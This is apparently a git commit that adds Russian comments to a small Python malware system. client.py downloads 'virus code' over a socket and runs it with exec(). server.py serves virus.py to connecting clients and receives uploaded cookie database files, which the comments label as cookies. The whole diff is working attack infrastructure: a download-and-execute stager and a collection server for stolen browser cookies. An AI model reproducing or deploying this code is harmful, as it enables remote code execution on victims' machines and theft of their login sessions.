336cda6d44f8766c53658998b26e6cfe1a530153
gurland <stas.gurland@gmail.com>
2018-08-11 06:42:59 +0300

    Add comments

--- client.py
+++ client.py
@@ -1,13 +1,15 @@
 import socket
 
+# Инициализация клиентского сокета
 sock = socket.socket()
 sock.connect(('localhost', 1488))
 
 code = b''
 
-sock.send(b'Download')
+sock.send(b'Download')  # Говорим серверу что мы хочем получить код вируса
 
 while True:
+    # Получаем код вируса по кусочкам
     code_chunk = sock.recv(1024)
 
     if not code_chunk:
@@ -16,5 +18,5 @@ while True:
 
     code += code_chunk
 
-sock.close()
-exec(code)
+sock.close()  # Закрываем соединение
+exec(code)  # Выполняем полученый код
--- server.py
+++ server.py
@@ -4,24 +4,31 @@ from uuid import uuid4
 with open('virus.py', 'rb') as virus_code:
     code = virus_code.read()
 
+# Инициализация серверного сокета, привязка к порту 1488
 sock = socket.socket()
 sock.bind(('', 1488))
+# Устанавливаем максимальное количество соединений
 sock.listen(10)
 
 try:
     while True:
+        # Блокирующий метод, ожидает нового соединения
         conn, addr = sock.accept()
 
         data = conn.recv(1024)
         if data == b'Download':
+            # Отослать код вируса
             conn.send(code)
             conn.close()
             print(f'Virus sent to {addr[0]}:{addr[1]}')
 
         elif data == b'Upload':
+            # Получить файл куков
             filename = f'{uuid4()}.sqlite'
+
             with open(filename, 'wb') as f:
                 while True:
+                    # Получение и запись файла по кусочкам по 1024 байта
                     file_chunk = conn.recv(1024)
                     if not file_chunk:
                         conn.close()
@@ -34,4 +41,5 @@ try:
             conn.close()
 
 except KeyboardInterrupt:
+    # Закрытие сокета по комбинации CTRL+C, для того, чтобы не занимать порт.
     sock.close()
